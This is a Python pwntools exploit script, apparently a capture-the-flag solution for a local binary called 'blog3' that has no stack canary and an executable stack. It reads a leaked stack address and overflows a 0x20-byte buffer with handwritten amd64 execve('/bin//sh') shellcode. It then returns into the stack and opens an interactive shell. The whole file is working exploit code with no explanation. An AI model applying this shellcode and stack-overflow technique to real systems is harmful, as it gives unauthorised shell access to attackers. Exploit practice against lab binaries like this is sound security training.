# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug')
fileName = './blog3'
p = process(fileName)
elf = ELF(fileName)


def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))


# rop
logger('rop')
p.sendlineafter(b'choose: \n', b'2')
p.recvuntil(b'return to stack: ')
bin_stack_top = int(p.recv(14), 16)

str_bin_sh = 0x68732f2f6e69622f
shellcode = '''
xor rdx, rdx
push rdx
mov rsi, rsp
push rbp
mov rdi, rsp
mov rax, 59
syscall
'''

shellcode = asm(shellcode, arch='amd64')
payload = shellcode + b'a' * \
    (0x20 - len(shellcode)) + p64(str_bin_sh) + p64(bin_stack_top)
p.sendlineafter(b'\n', payload)

p.interactive()
